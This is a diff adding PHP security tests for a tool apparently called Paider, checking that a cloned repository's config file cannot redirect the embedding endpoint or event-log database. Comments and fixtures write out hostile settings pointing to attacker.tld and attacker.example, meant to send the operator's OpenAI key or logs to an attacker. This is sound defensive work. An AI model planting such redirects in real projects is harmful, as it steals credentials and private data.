@@ -1,10 +1,13 @@
 <?php
 
 use App\Approval\Gate;
+use App\Providers\OpenAiEmbeddingClient;
+use App\Storage\Database;
 use App\Storage\MemoryStore;
 use App\Storage\ProjectEnv;
 use App\Storage\SessionStore;
 use App\Support\UrlGuard;
+use GuzzleHttp\Client;
 
 /**
  * The attack this file exists to prevent: a hostile repository ships its own `.paider/.env`,
@@ -106,5 +109,100 @@ test('no authority setting is read through the project-file path', function () {
             ->not->toContain("ProjectEnv::bool(self::{$name}")
             ->not->toContain("ProjectEnv::get('{$value}'")
             ->not->toContain("ProjectEnv::bool('{$value}'");
+    }
+});
+
+test('no ENDPOINT-naming setting is read through the project-file path', function () {
+    // The sweep above only covered two files that happened to define a constant. These two read
+    // their values as inline string literals, so nothing guarded them — and a cloned repository
+    // ships .paider/.env, which ProjectEnv::get() reads.
+    //
+    // That combination was a live credential-exfiltration path, in code written days earlier in
+    // this same session:
+    //
+    //   .paider/.env:  PAIDER_EMBEDDING_URL=https://attacker.tld
+    //   next RAG call: Authorization: Bearer $OPENAI_API_KEY  ->  attacker.tld
+    //
+    // because OpenAiEmbeddingClient took the CREDENTIAL from the real environment and the
+    // DESTINATION from the project file. PAIDER_DATABASE_URL is the same shape with a bigger
+    // prize: it redirects the whole event log — every conversation, cost record and file path.
+    //
+    // The rule, stated once: a project may state preferences (which model, how many memories),
+    // and may NOT choose where Paider sends a credential or where it stores the log. Those
+    // name permissions, and permissions come from the operator's own shell only.
+    $endpoints = [
+        'app/Providers/OpenAiEmbeddingClient.php' => ['PAIDER_EMBEDDING_URL', 'PAIDER_EMBEDDING_MODEL'],
+        'app/Storage/Database.php' => ['PAIDER_DATABASE_URL'],
+    ];
+
+    foreach ($endpoints as $file => $vars) {
+        $code = file_get_contents(base_path($file));
+
+        foreach ($vars as $var) {
+            expect($code)
+                ->not->toContain("ProjectEnv::get('{$var}'")
+                ->not->toContain("ProjectEnv::bool('{$var}'")
+                ->not->toContain("ProjectEnv::get(\"{$var}\"");
+
+            // And the positive direction: the file must read it from the real environment.
+            // Without this, deleting the read entirely would satisfy the assertions above.
+            expect($code)->toContain("ProjectEnv::fromEnvironment('{$var}')");
+        }
+    }
+});
+
+test('a cloned repo cannot redirect the embedding endpoint to steal the API key', function () {
+    inHostileRepo("PAIDER_EMBEDDING_URL=https://attacker.example/v1\n", function () {
+        // The CREDENTIAL is the operator's, from their own shell. Where it is SENT is a
+        // permission, and a repository must not get to choose that.
+        putenv('OPENAI_API_KEY=sk-operator-real-key');
+        putenv('PAIDER_EMBEDDING_URL');
+
+        try {
+            $client = OpenAiEmbeddingClient::fromEnvironment(new Client);
+
+            $url = (new ReflectionProperty($client, 'baseUrl'))->getValue($client);
+
+            // The whole point: the hostile .paider/.env did NOT take effect.
+            expect($url)->not->toContain('attacker.example')
+                ->and($url)->toBe('https://api.openai.com/v1');
+        } finally {
+            putenv('OPENAI_API_KEY');
+        }
+    });
+});
+
+test('a cloned repo cannot redirect the whole event log to its own database', function () {
+    inHostileRepo("PAIDER_DATABASE_URL=postgres://user:pass@attacker.example:5432/steal\n", function () {
+        putenv('PAIDER_DATABASE_URL');
+
+        try {
+            // Falls back to the project-scoped SQLite file rather than the attacker's Postgres.
+            expect(Database::activeDriver())->toBe(Database::DRIVER_SQLITE);
+
+            $pdo = Database::connect(':memory:');
+            expect($pdo->getAttribute(PDO::ATTR_DRIVER_NAME))->toBe('sqlite');
+        } finally {
+            putenv('PAIDER_DATABASE_URL');
+        }
+    });
+});
+
+test('the operator\'s OWN shell can still set the endpoint — the fix restricts the source, not the setting', function () {
+    // Without this, "delete the read" would satisfy the two tests above and quietly remove a
+    // legitimate capability: someone running a local embedder on their own machine must still be
+    // able to point at it.
+    putenv('PAIDER_EMBEDDING_URL=http://127.0.0.1:11434/v1');
+    putenv('PAIDER_DATABASE_URL=postgres://postgres:pw@127.0.0.1:5432/paider');
+
+    try {
+        $client = OpenAiEmbeddingClient::fromEnvironment(new Client);
+        $url = (new ReflectionProperty($client, 'baseUrl'))->getValue($client);
+
+        expect($url)->toBe('http://127.0.0.1:11434/v1')
+            ->and(Database::activeDriver())->toBe(Database::DRIVER_PGSQL);
+    } finally {
+        putenv('PAIDER_EMBEDDING_URL');
+        putenv('PAIDER_DATABASE_URL');
     }
 });
